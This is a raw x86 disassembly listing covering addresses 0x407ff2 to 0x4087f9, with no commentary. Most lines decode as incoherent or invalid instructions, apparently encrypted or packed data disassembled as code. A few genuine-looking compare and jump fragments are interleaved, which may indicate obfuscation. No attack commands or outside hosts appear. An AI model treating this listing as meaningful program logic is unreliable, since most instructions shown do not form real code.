  407ff2:	arpl   WORD PTR [edi],bx
  407ff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ff5:	pop    ss
  407ff6:	or     eax,0xea2da782
  407ffb:	cmc    
  407ffc:	mov    ds:0x96e0fea2,al
  408001:	mov    ds:0x7b9a5ecb,eax
  408006:	mov    bh,0x3e
  408008:	jmp    0xf1d2a179
  40800d:	push   0xffffff97
  40800f:	dec    esi
  408010:	push   edx
  408011:	test   BYTE PTR [edx+0x38],al
  408014:	ins    BYTE PTR es:[edi],dx
  408015:	sbb    ch,al
  408017:	inc    ecx
  408018:	or     BYTE PTR [eax+0x64],0xc4
  40801c:	mov    ah,0xa1
  40801e:	xchg   esi,eax
  40801f:	push   eax
  408020:	sub    bh,BYTE PTR [esi+0x108f4de1]
  408026:	dec    ebx
  408027:	jnp    0x40804f
  408029:	mov    ebp,ebp
  40802b:	jo     0x407fc9
  40802d:	ret    0xf5b4
  408030:	ror    BYTE PTR [ebx],0xec
  408033:	push   esi
  408034:	and    DWORD PTR [ecx-0x2209d0a5],esi
  40803a:	lods   al,BYTE PTR ds:[esi]
  40803b:	sbb    eax,0xc3a34963
  408040:	pop    esi
  408041:	int    0xa8
  408043:	sub    eax,0x5d5725ef
  408048:	dec    eax
  408049:	add    eax,0xa1dce754
  40804e:	push   es
  40804f:	hlt    
  408050:	mov    DWORD PTR [edi],edi
  408052:	sbb    edx,DWORD PTR [ebp-0x7a757925]
  408058:	test   DWORD PTR [ecx-0x456d0c61],ebp
  40805e:	and    eax,0x1b10869c
  408063:	push   esp
  408064:	shr    DWORD PTR [esi-0x22],1
  408067:	iret   
  408068:	jmp    0x8b606ef
  40806d:	jp     0x408066
  40806f:	dec    edi
  408070:	ror    edx,0x2b
  408073:	sub    eax,0x846ca03d
  408078:	in     al,dx
  408079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40807a:	jg     0x408023
  40807c:	popf   
  40807d:	add    al,0x4e
  40807f:	jne    0x408099
  408081:	imul   edi,DWORD PTR [edx],0xffffff8d
  408084:	jo     0x408026
  408086:	mov    al,0x16
  408088:	lock bound eax,QWORD PTR [esi]
  40808b:	mov    esp,DWORD PTR [ebx+esi*2+0x6c5c407c]
  408092:	pop    ecx
  408093:	jg     0x4080e3
  408095:	fdivr  DWORD PTR [ecx-0x557b78b2]
  40809b:	test   esi,0xec2b689a
  4080a1:	aaa    
  4080a2:	ror    BYTE PTR [esi-0x2dc0440a],1
  4080a8:	fs retf 0xd1ae
  4080ac:	jne    0x408074
  4080ae:	test   BYTE PTR [ebx-0x14],0x60
  4080b2:	xor    DWORD PTR [ebp+eiz*1-0x63b56483],ebp
  4080b9:	mov    dl,0xfe
  4080bb:	pop    ss
  4080bc:	retf   
  4080bd:	ds (bad) 
  4080bf:	loop   0x408106
  4080c1:	dec    ecx
  4080c2:	jne    0x4080e7
  4080c4:	adc    BYTE PTR [ebx],ch
  4080c6:	cmp    dl,BYTE PTR [esi+eiz*2]
  4080c9:	std    
  4080ca:	test   BYTE PTR [edi+0x42],al
  4080cd:	sub    DWORD PTR [edi],0x7b
  4080d0:	and    BYTE PTR [ebx],dh
  4080d2:	rol    DWORD PTR [ebx],0xc6
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx+0x47e0c275],eax
  4080f8:	inc    edi
  4080f9:	hlt    
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x408141
  408102:	hlt    
  408103:	mov    ecx,ebx
  408105:	jne    0x40817e
  408107:	shl    BYTE PTR [esi],cl
  408109:	sahf   
  40810a:	stos   BYTE PTR es:[edi],al
  40810b:	not    DWORD PTR [edx-0x17]
  40810e:	add    ebx,ecx
  408110:	inc    ecx
  408111:	(bad)  
  408113:	sub    ecx,edi
  408115:	xchg   DWORD PTR [esi+0x18cfe390],eax
  40811b:	mov    ebp,esi
  40811d:	inc    eax
  40811e:	test   BYTE PTR [esi+esi*4-0x16182b0e],al
  408125:	sub    al,0x61
  408127:	mov    al,0xac
  408129:	pop    esp
  40812a:	push   cs
  40812b:	sbb    BYTE PTR [esi-0x43],dl
  40812e:	clc    
  40812f:	jo     0x40817d
  408131:	adc    ebp,edi
  408133:	scas   al,BYTE PTR es:[edi]
  408134:	mov    ds:0x877de9aa,al
  408139:	or     al,BYTE PTR [eax+0x1963a394]
  40813f:	jmp    0x408154
  408141:	mov    ecx,fs
  408143:	leave  
  408144:	mov    ch,al
  408146:	mov    esi,0x5ae86e2
  40814b:	mov    esi,0xb3d9359c
  408150:	lods   eax,DWORD PTR ds:[esi]
  408151:	(bad)  
  408152:	test   eax,0x1bc95fff
  408157:	test   BYTE PTR [edi-0x46502582],dh
  40815d:	pop    ds
  40815e:	adc    al,0x8e
  408160:	(bad)  
  408161:	ficom  DWORD PTR [esi]
  408163:	fsubr  st,st(3)
  408165:	xchg   ecx,eax
  408166:	xor    eax,0x8824ada3
  40816b:	cmp    DWORD PTR [ebx-0x69],edi
  40816e:	loope  0x4081d9
  408170:	test   al,0xf
  408172:	es mov edx,0x9d5a9aa1
  408178:	sar    BYTE PTR [edi-0x6c],0x5c
  40817c:	div    bh
  40817e:	jecxz  0x40817a
  408180:	out    dx,al
  408181:	pop    ebp
  408182:	call   0x9eae6a1
  408187:	imul   ecx,edi,0xffffffba
  40818a:	push   esp
  40818b:	jnp    0x408180
  40818d:	push   ebp
  40818e:	mov    ?,ebp
  408190:	xor    DWORD PTR [esi+0x2c4cc8bb],edx
  408196:	and    BYTE PTR ds:0x36b26a50,cl
  40819c:	lods   al,BYTE PTR ds:[esi]
  40819d:	and    BYTE PTR [ecx+0x3ad16608],al
  4081a3:	gs push esi
  4081a5:	lods   al,BYTE PTR ds:[esi]
  4081a6:	popf   
  4081a7:	ds pop edi
  4081a9:	(bad)  
  4081ab:	stos   DWORD PTR es:[edi],eax
  4081ac:	mov    ebp,0x7ef9e063
  4081b1:	ins    BYTE PTR es:[edi],dx
  4081b2:	addr16 repz loop 0x4081e1
  4081b6:	call   0x3ad8:0xdab8f665
  4081bd:	mov    esi,esp
  4081bf:	or     BYTE PTR [esi-0x50],0xc
  4081c3:	cmp    ebp,DWORD PTR [ecx+esi*4+0x810346f]
  4081ca:	xlat   BYTE PTR ds:[ebx]
  4081cb:	jmp    esi
  4081cd:	xchg   DWORD PTR [ecx+0x1b],esi
  4081d0:	mov    BYTE PTR ds:[eax-0x6b2f6817],dh
  4081d7:	push   di
  4081d9:	push   ss
  4081da:	in     al,dx
  4081db:	cmp    BYTE PTR [ecx+0x49ad109f],0xd1
  4081e2:	ret    
  4081e3:	mov    BYTE PTR [ebx-0x63],al
  4081e6:	inc    esp
  4081e7:	mov    ds:0x7a0cfbf3,eax
  4081ec:	mov    esp,esp
  4081ee:	mov    edx,0xa1c0c771
  4081f3:	jne    0x408217
  4081f5:	push   eax
  4081f6:	(bad)  
  4081f7:	(bad)  
  4081f8:	in     al,0xea
  4081fa:	jge    0x408267
  4081fc:	mov    esi,0x722627
  408201:	mov    ecx,0xdd3af3cb
  408206:	(bad)  
  408207:	test   eax,0x3c1ff706
  40820c:	and    dh,bl
  40820e:	dec    esi
  40820f:	or     ecx,DWORD PTR ds:0xf89afe51
  408215:	lock inc edi
  408217:	iret   
  408218:	and    DWORD PTR [edx],0x2f
  40821b:	jbe    0x408222
  40821d:	movaps xmm0,XMMWORD PTR ds:0x512fea03
  408224:	pusha  
  408225:	pop    ss
  408226:	push   ebp
  408227:	in     eax,0x96
  408229:	loop   0x40822a
  40822b:	cmp    ecx,DWORD PTR [eax]
  40822d:	scas   eax,DWORD PTR es:[edi]
  40822e:	fs hlt 
  408230:	dec    eax
  408231:	js     0x4082a1
  408233:	jnp    0x4082b4
  408235:	ja     0x40823d
  408237:	and    al,0x5a
  408239:	cs jno 0x4081e7
  40823c:	sbb    al,0x1b
  40823e:	cs pop eax
  408240:	aas    
  408241:	add    DWORD PTR [edi-0x5a74ffd4],ebx
  408247:	xor    edx,DWORD PTR [edx]
  408249:	sub    esi,eax
  40824b:	aad    0x53
  40824d:	or     edi,eax
  40824f:	mov    dh,0x0
  408251:	adc    DWORD PTR [ecx],ebx
  408253:	jge    0x408276
  408255:	ret    0x25f2
  408258:	push   ds
  408259:	outs   dx,DWORD PTR ds:[esi]
  40825a:	add    eax,edi
  40825c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40825d:	mov    DWORD PTR [edi],ebx
  40825f:	xchg   edx,eax
  408260:	ret    0x3a65
  408263:	xor    al,0x6d
  408265:	pusha  
  408266:	adc    dh,0xab
  408269:	inc    ebx
  40826a:	cmp    al,0xbd
  40826c:	fisttp QWORD PTR [esi]
  40826e:	sbb    DWORD PTR [edx-0x29d57975],eax
  408274:	jmp    0x40824b
  408276:	(bad)  
  408277:	xor    bh,BYTE PTR [esi+ecx*2+0x11]
  40827b:	push   eax
  40827c:	inc    eax
  40827d:	cmp    edx,DWORD PTR [esi-0x3f]
  408280:	sub    DWORD PTR [edx-0x56],esi
  408283:	gs jb  0x408215
  408286:	sub    ch,BYTE PTR [esi-0x6e]
  408289:	xchg   ebp,eax
  40828a:	cwde   
  40828b:	xchg   DWORD PTR [ebx-0x17],edi
  40828e:	adc    al,0x44
  408290:	ror    bl,0x30
  408293:	dec    ecx
  408294:	pop    ss
  408295:	ins    DWORD PTR es:[edi],dx
  408296:	outs   dx,BYTE PTR ds:[esi]
  408297:	cmc    
  408298:	hlt    
  408299:	jp     0x40830c
  40829b:	jne    0x4082ee
  40829d:	mov    ecx,0xef366745
  4082a2:	test   DWORD PTR [ebx],edi
  4082a4:	popf   
  4082a5:	pop    ecx
  4082a6:	pop    ds
  4082a7:	pop    edx
  4082a8:	jge    0x40830c
  4082aa:	mov    ebx,0xabe3b0f4
  4082af:	pop    esi
  4082b0:	inc    ebp
  4082b1:	ss out 0xd1,al
  4082b4:	sub    al,cl
  4082b6:	enter  0x4bb1,0xff
  4082ba:	pop    es
  4082bb:	in     eax,dx
  4082bc:	repnz out dx,eax
  4082be:	or     ebp,DWORD PTR [ecx]
  4082c0:	pop    ebx
  4082c1:	sbb    eax,0xef5ccc78
  4082c6:	das    
  4082c7:	mov    dh,0xa6
  4082c9:	cmp    DWORD PTR [eax+edi*8+0x37],edx
  4082cd:	imul   ebp,DWORD PTR [edx-0x7e],0xffffffe9
  4082d1:	daa    
  4082d2:	lahf   
  4082d3:	adc    DWORD PTR [ebx+0x76],edx
  4082d6:	sub    esi,ebx
  4082d8:	inc    eax
  4082d9:	ret    0x32e5
  4082dc:	test   eax,0x79cc369d
  4082e1:	sbb    DWORD PTR [esi+eiz*1],esi
  4082e4:	ror    ebp,cl
  4082e6:	xor    bl,BYTE PTR [esi-0x192a5beb]
  4082ec:	call   0xde46988f
  4082f1:	cwde   
  4082f2:	sub    al,0x96
  4082f4:	int    0x3e
  4082f6:	stc    
  4082f7:	pop    ds
  4082f8:	pop    esi
  4082f9:	or     eax,0xce8523ef
  4082fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082ff:	mov    esp,0x408a7e88
  408304:	es clc 
  408306:	clc    
  408307:	into   
  408308:	inc    ebx
  408309:	xor    BYTE PTR [ecx+0x9d7a00f],bh
  40830f:	fld    DWORD PTR [ebp+0x4d]
  408312:	sub    DWORD PTR [ecx-0x602978db],esp
  408318:	dec    ebp
  408319:	in     al,0x65
  40831b:	icebp  
  40831c:	add    al,0xb1
  40831e:	or     DWORD PTR [eax+0x74fb730d],edx
  408324:	fwait
  408325:	adc    ebx,esi
  408327:	xrelease mov DWORD PTR [ebx+0x3a],0xf4d3303e
  40832f:	mov    dl,BYTE PTR [ebx]
  408331:	ss adc ebp,edx
  408334:	xor    dh,dh
  408336:	add    bl,BYTE PTR [esp+ecx*2]
  408339:	pusha  
  40833a:	popf   
  40833b:	add    eax,edi
  40833d:	xchg   ecx,eax
  40833e:	(bad)  
  40833f:	lds    ecx,FWORD PTR [ebx+0x14]
  408342:	icebp  
  408343:	mov    cl,0x34
  408345:	xchg   esp,eax
  408346:	clc    
  408347:	adc    dh,ah
  408349:	push   esp
  40834a:	(bad)  
  40834b:	in     al,0x55
  40834d:	loope  0x408310
  40834f:	xchg   edi,eax
  408350:	add    al,0x32
  408352:	xchg   ebp,eax
  408353:	adc    al,0x24
  408355:	cmp    al,0xc4
  408357:	loop   0x4083b8
  408359:	or     al,0x25
  40835b:	mov    DWORD PTR [edi-0x75],ebx
  40835e:	mov    cl,0x25
  408360:	loopne 0x408372
  408362:	mov    al,0xc
  408364:	dec    ebp
  408365:	mov    DWORD PTR [esp+esi*2+0xd8a51fe],edi
  40836c:	ja     0x4083b6
  40836e:	pusha  
  40836f:	jp     0x4083b3
  408371:	dec    ebp
  408372:	sbb    BYTE PTR [ebp-0x46860112],dl
  408378:	gs fwait
  40837a:	mov    al,0x3f
  40837c:	nop
  40837d:	push   ebx
  40837e:	into   
  40837f:	cwde   
  408380:	cmp    eax,0x5614c699
  408385:	mov    eax,ds:0xd84ba76
  40838a:	xchg   ecx,eax
  40838b:	and    dh,BYTE PTR [ebx-0xf97e75a]
  408391:	jle    0x4083cc
  408393:	pop    ds
  408394:	mov    ds:0x2b123e53,al
  408399:	cli    
  40839a:	pop    ebp
  40839b:	and    bl,BYTE PTR [esi]
  40839d:	adc    eax,0xd4d5d2
  4083a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083a3:	mov    ds:0x84d56110,eax
  4083a8:	and    BYTE PTR [ecx+0x693f3b33],0xec
  4083af:	push   cs
  4083b0:	fwait
  4083b1:	jle    0x4083f8
  4083b3:	loop   0x40841e
  4083b5:	ret    0x21b0
  4083b8:	(bad)  
  4083b9:	xlat   BYTE PTR ds:[ebx]
  4083ba:	ret    0x35f6
  4083bd:	addr16 iret 
  4083bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083c0:	xchg   esp,eax
  4083c1:	outs   dx,BYTE PTR ds:[esi]
  4083c2:	int3   
  4083c3:	sub    eax,0xf30ddee4
  4083c8:	mov    ds:0x6f1c2c2b,al
  4083cd:	pop    ds
  4083ce:	dec    esp
  4083cf:	daa    
  4083d0:	(bad)  
  4083d1:	and    DWORD PTR [ebx],edx
  4083d3:	cmp    bh,BYTE PTR [ecx]
  4083d5:	add    esp,DWORD PTR [edi+ebp*2]
  4083d8:	adc    bl,BYTE PTR [ecx-0x40d3a75e]
  4083de:	xor    ecx,DWORD PTR [ebp+0x7b1ab242]
  4083e4:	and    al,0x3a
  4083e6:	mov    edi,ebp
  4083e8:	pop    ebx
  4083e9:	jno    0x408391
  4083eb:	push   ds
  4083ec:	mov    ah,0x8a
  4083ee:	inc    esp
  4083ef:	add    eax,0xff558aa8
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi-0x1b117b60],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x4083f1
  408448:	and    esi,ebx
  40844a:	or     BYTE PTR [ecx-0x3a86e756],dl
  408450:	sahf   
  408451:	stc    
  408452:	and    ch,BYTE PTR [ebp-0x4c]
  408455:	div    dl
  408457:	add    eax,0x4c89c2ff
  40845c:	xlat   BYTE PTR ds:[ebx]
  40845d:	std    
  40845e:	pushf  
  40845f:	rcr    BYTE PTR [eax-0x31],cl
  408462:	ror    dl,cl
  408464:	rcl    DWORD PTR ds:0x4926f8fa,cl
  40846a:	xor    eax,0x891e25
  40846f:	jmp    0x4083f9
  408471:	js     0x4084c1
  408473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408474:	ror    BYTE PTR [ebp+0x649380bf],1
  40847a:	xchg   ebp,eax
  40847b:	mov    ds:0x8ba27cea,eax
  408480:	stc    
  408481:	xor    DWORD PTR [ecx+0x8],edx
  408484:	and    ebx,DWORD PTR [edi+eax*4+0x288e5f25]
  40848b:	dec    eax
  40848c:	xchg   esi,eax
  40848d:	call   0xd4a45230
  408492:	jmp    0xcd89:0xf5b664bd
  408499:	ja     0x40844d
  40849b:	sahf   
  40849c:	mov    ebp,esi
  40849e:	test   BYTE PTR [edi+0x42],al
  4084a1:	adc    ah,BYTE PTR [ecx]
  4084a3:	sar    DWORD PTR [ebx+0x6d5854c9],0x85
  4084aa:	int    0xa1
  4084ac:	mov    bl,0xb2
  4084ae:	repz cmp al,0x49
  4084b1:	mov    bh,0x4a
  4084b3:	adc    BYTE PTR [eax+0x3ae3717c],al
  4084b9:	(bad)  
  4084ba:	and    BYTE PTR [edi+0x136128c3],bh
  4084c0:	inc    ecx
  4084c1:	xchg   edx,ebp
  4084c3:	sub    eax,0x4c73a59b
  4084c8:	adc    cl,BYTE PTR [edx-0x3b885f32]
  4084ce:	out    0x20,al
  4084d0:	out    0xd3,eax
  4084d2:	jle    0x408481
  4084d4:	jae    0x4084ad
  4084d6:	ror    BYTE PTR [ecx-0x418d89b1],cl
  4084dc:	lock sub al,0x93
  4084df:	stos   DWORD PTR es:[edi],eax
  4084e0:	or     eax,0xc0bbf049
  4084e5:	(bad)  
  4084e6:	sbb    esp,ebp
  4084e8:	sub    ebx,DWORD PTR [ebp+0x28]
  4084eb:	aam    0x44
  4084ed:	add    bl,bh
  4084ef:	arpl   WORD PTR [ecx+0x20],bx
  4084f2:	push   ds
  4084f3:	sub    BYTE PTR [edx+edi*4+0x3ca6a0a0],0x7d
  4084fb:	ins    DWORD PTR es:[edi],dx
  4084fc:	push   edi
  4084fd:	dec    esi
  4084fe:	jbe    0x4084c5
  408500:	(bad)  
  408501:	jmp    0x408557
  408503:	add    al,dl
  408505:	sahf   
  408506:	aas    
  408507:	pop    edx
  408508:	das    
  408509:	push   ds
  40850a:	sbb    DWORD PTR [edx],ecx
  40850c:	jg     0x4084e9
  40850e:	jmp    0xe38a3d53
  408513:	adc    al,BYTE PTR [ecx+edi*2-0x49]
  408517:	and    edx,ecx
  408519:	nop
  40851a:	inc    eax
  40851b:	rcl    BYTE PTR [eax+0x2e2670a5],0x8c
  408522:	push   ecx
  408523:	add    al,BYTE PTR [ecx+0x1b]
  408526:	ror    DWORD PTR [eax+esi*4],1
  408529:	out    dx,al
  40852a:	cmp    DWORD PTR [eax],esi
  40852c:	pop    edi
  40852d:	pushw  0x9a79
  408531:	xchg   BYTE PTR [esi],dl
  408533:	stos   DWORD PTR es:[edi],eax
  408534:	das    
  408535:	pop    ebx
  408536:	or     BYTE PTR [ebx+0x649ff0d8],dl
  40853c:	xchg   DWORD PTR [eax-0x59],edi
  40853f:	jmp    0x9621:0xc2360cb1
  408546:	push   esi
  408547:	xchg   esi,eax
  408548:	mov    ch,0xb9
  40854a:	push   ds
  40854b:	icebp  
  40854c:	in     al,dx
  40854d:	fimul  WORD PTR [eax-0x1c6c07bb]
  408553:	repz mov sp,0x85e0
  408558:	mul    DWORD PTR [eax]
  40855a:	aam    0x18
  40855c:	lods   al,BYTE PTR ds:[esi]
  40855d:	(bad)
  408560:	xchg   ecx,eax
  408561:	push   esi
  408562:	sub    edx,esp
  408564:	mov    edi,0xcd56b138
  408569:	mov    al,0x5c
  40856b:	pop    ebp
  40856c:	adc    ebx,DWORD PTR [ebx]
  40856e:	ss mov ebp,0x9bceaa37
  408574:	adc    esi,ebp
  408576:	jbe    0x408539
  408578:	mov    ah,0x16
  40857a:	imul   edx,edx,0x7
  40857d:	or     ch,BYTE PTR ds:0x396bfc80
  408583:	pop    ss
  408584:	pushf  
  408585:	ja     0x408585
  408587:	pop    ss
  408588:	jle    0x4085b1
  40858a:	cmp    esi,DWORD PTR fs:[eax]
  40858d:	arpl   WORD PTR [ebp*2-0x9c068bb],di
  408594:	into   
  408595:	and    eax,0x8930bf81
  40859a:	fimul  DWORD PTR [ecx]
  40859c:	jne    0x408618
  40859e:	mov    al,0xb7
  4085a0:	xlat   BYTE PTR ds:[ebx]
  4085a1:	mov    al,ds:0xc7ab5c8a
  4085a6:	xor    DWORD PTR [ebp+ebp*4+0x19caedd1],esp
  4085ad:	pop    es
  4085ae:	xchg   esi,eax
  4085af:	retf   
  4085b0:	pop    es
  4085b1:	jl     0x408554
  4085b3:	scas   eax,DWORD PTR es:[edi]
  4085b4:	or     BYTE PTR [ecx+0x41],ch
  4085b7:	cs pop esi
  4085b9:	sbb    al,0x4
  4085bb:	rcr    DWORD PTR [ebx-0x402a03fe],0x23
  4085c2:	push   0xb
  4085c4:	icebp  
  4085c5:	retf   
  4085c6:	shl    DWORD PTR [ecx-0xf2fbaf5],cl
  4085cc:	loope  0x408630
  4085ce:	jne    0x408596
  4085d0:	jecxz  0x408620
  4085d2:	add    DWORD PTR [esi+0x30ba7c23],ebp
  4085d8:	cmp    bl,bl
  4085da:	popa   
  4085db:	fidiv  WORD PTR [edi+0x33aae625]
  4085e1:	pop    ebp
  4085e2:	retf   0xd281
  4085e5:	mov    DWORD PTR [edx+0x4a],ecx
  4085e8:	jno    0x408644
  4085ea:	fst    DWORD PTR [edi+0x28a7dda8]
  4085f0:	sub    edx,ebx
  4085f2:	bts    DWORD PTR [esp+ecx*1+0x4966e140],ebp
  4085fa:	ja     0x408602
  4085fc:	shr    DWORD PTR [esi+0x550030a6],0xf6
  408603:	imul   edx,DWORD PTR [edx],0x3ca94742
  408609:	mov    cl,bl
  40860b:	std    
  40860c:	test   al,0x2d
  40860e:	or     eax,0xfd033935
  408613:	adc    cl,BYTE PTR [edx-0x7e]
  408616:	pop    ds
  408617:	aam    0x20
  408619:	fwait
  40861a:	test   esi,esi
  40861c:	pop    ecx
  40861d:	mov    ds:0x48bd9251,eax
  408622:	mov    DWORD PTR ds:0x4b63b973,ebp
  408628:	push   cs
  408629:	mov    al,BYTE PTR [edi+0x6f]
  40862c:	ret    0x591c
  40862f:	inc    edx
  408630:	mov    al,0x6e
  408632:	add    DWORD PTR [edi+0x74],edi
  408635:	movd   mm0,DWORD PTR ss:[ecx+ebp*1]
  40863a:	fdiv   DWORD PTR [eax-0x7e]
  40863d:	mov    eax,ds:0x362296c7
  408642:	call   0x9f669184
  408647:	jecxz  0x40869f
  408649:	xchg   BYTE PTR [ecx+0x57],dh
  40864c:	jne    0x408650
  40864e:	mov    ebx,0x6c662953
  408653:	jno    0x408689
  408655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408656:	mov    ebp,0x31829e6d
  40865b:	je     0x408650
  40865d:	mov    ds:0x2b8bc0d5,eax
  408662:	in     al,dx
  408663:	dec    ebx
  408664:	pushf  
  408665:	cld    
  408666:	js     0x40861e
  408668:	xchg   edi,eax
  408669:	pop    ds
  40866a:	and    al,0xe0
  40866c:	adc    bh,BYTE PTR [edi]
  40866e:	dec    ebx
  40866f:	lock xor dh,BYTE PTR [edi+0x49f98282]
  408676:	adc    esi,esp
  408678:	xor    eax,DWORD PTR [edx-0x4395d8c4]
  40867e:	gs pusha 
  408680:	loop   0x4086f4
  408682:	mov    BYTE PTR ds:0x65633c07,dl
  408688:	xor    cl,BYTE PTR [edx]
  40868a:	inc    esp
  40868b:	dec    esp
  40868c:	out    0x6b,al
  40868e:	xor    dh,BYTE PTR [eax]
  408690:	push   cs
  408691:	fidivr DWORD PTR [ebx+0x5b]
  408694:	jmp    0x40864d
  408696:	adc    DWORD PTR [edi],edi
  408698:	(bad)  
  408699:	in     eax,dx
  40869a:	in     al,dx
  40869b:	jp     0x408657
  40869d:	jnp    0x408653
  40869f:	jnp    0x4086ff
  4086a1:	repz adc DWORD PTR [edx],eax
  4086a4:	sub    BYTE PTR [eax],al
  4086a6:	test   eax,0x70648573
  4086ab:	das    
  4086ac:	int    0xa8
  4086ae:	xchg   DWORD PTR [esi-0x70],edi
  4086b1:	adc    bh,BYTE PTR [eax+0x66]
  4086b4:	cwde   
  4086b5:	test   esp,0x8afdba
  4086bb:	dec    esp
  4086bc:	mov    bl,0x7f
  4086be:	aas    
  4086bf:	arpl   WORD PTR [edx+0x1b],bp
  4086c2:	push   cs
  4086c3:	mov    ds:0x6131a3c8,al
  4086c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086c9:	outs   dx,DWORD PTR ds:[esi]
  4086ca:	call   FWORD PTR [ebp+0x1cfe7c11]
  4086d0:	pop    es
  4086d1:	mov    dh,0xdf
  4086d3:	test   eax,0x701c1de6
  4086d8:	imul   BYTE PTR [ecx]
  4086da:	push   esi
  4086db:	mov    edx,0x4b4c1fa8
  4086e0:	cwde   
  4086e1:	jbe    0x4086df
  4086e3:	mov    al,0x78
  4086e5:	xchg   edx,eax
  4086e6:	ss aaa 
  4086e8:	cdq    
  4086e9:	lea    eax,[edi]
  4086eb:	and    edx,ecx
  4086ed:	pop    edi
  4086ee:	lds    edx,FWORD PTR ds:0x7aeac094
  4086f4:	jno    0x40868b
  4086f6:	jg     0x4086e1
  4086f8:	xor    BYTE PTR [eax-0xc],dl
  4086fb:	scas   al,BYTE PTR es:[edi]
  4086fc:	mov    eax,0x1b357e22
  408701:	cmp    DWORD PTR [esi-0x1f763399],ebx
  408707:	cmp    bl,BYTE PTR [edi+0x25ea2810]
  40870d:	fwait
  40870e:	push   edi
  40870f:	xor    al,0x5f
  408711:	in     al,dx
  408712:	or     DWORD PTR [ecx+0x1173c201],edi
  408718:	pop    ecx
  408719:	in     eax,dx
  40871a:	mov    al,ds:0x130edd87
  40871f:	fistp  WORD PTR [eax+0x4a]
  408722:	jmp    0xa1cd:0x6f806597
  408729:	sub    DWORD PTR [ebx+0xbd73be9],ecx
  40872f:	sbb    al,0xb5
  408731:	call   FWORD PTR [edx-0x7617ba73]
  408737:	inc    ebp
  408738:	in     al,dx
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	cmc    
  408778:	das    
  408779:	add    esp,0xffffffcc
  40877c:	out    0x78,eax
  40877e:	js     0x4087e4
  408780:	jle    0x4087fa
  408782:	js     0x4087f7
  408784:	lods   eax,DWORD PTR ds:[esi]
  408785:	push   cs
  408786:	push   esp
  408787:	cdq    
  408788:	jmp    0xe9b84aeb
  40878d:	call   0x77549183
  408792:	outs   dx,DWORD PTR ds:[esi]
  408793:	inc    edx
  408794:	adc    ebx,DWORD PTR [edx]
  408796:	out    dx,al
  408797:	fidivr DWORD PTR [esi-0x205c0202]
  40879d:	jnp    0x40881e
  40879f:	test   eax,0x4f3a5b30
  4087a4:	cli    
  4087a5:	xor    esi,ebx
  4087a7:	daa    
  4087a8:	add    dh,BYTE PTR [eax-0x359359ed]
  4087ae:	adc    dh,bl
  4087b0:	fist   DWORD PTR [ebx+edx*2-0x42]
  4087b4:	add    ebx,DWORD PTR [edx]
  4087b6:	xor    BYTE PTR [eax-0x73c9c17b],dl
  4087bc:	daa    
  4087bd:	pop    ebp
  4087be:	xor    ah,BYTE PTR [edx-0x28]
  4087c1:	cwde   
  4087c2:	fdiv   DWORD PTR [esi-0x41872e0c]
  4087c8:	xchg   esp,eax
  4087c9:	pop    ebp
  4087ca:	inc    eax
  4087cb:	fcomp  QWORD PTR [eax]
  4087cd:	jbe    0x408820
  4087cf:	rcl    eax,cl
  4087d1:	bnd js 0x4087f2
  4087d4:	jge    0x408792
  4087d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087d7:	jo     0x408805
  4087d9:	sbb    al,0xff
  4087db:	(bad)  
  4087dc:	scas   eax,DWORD PTR es:[edi]
  4087dd:	xchg   esi,ebp
  4087df:	cmc    
  4087e0:	cmp    DWORD PTR [ecx-0x17f76c02],0xe46c0e61
  4087ea:	fwait
  4087eb:	into   
  4087ec:	int    0xa0
  4087ee:	mov    edi,0xafdce3ae
  4087f3:	cmc    
  4087f4:	ins    BYTE PTR es:[edi],dx
  4087f5:	enter  0x73d1,0xfa
  4087f9:	shl    ebp,cl
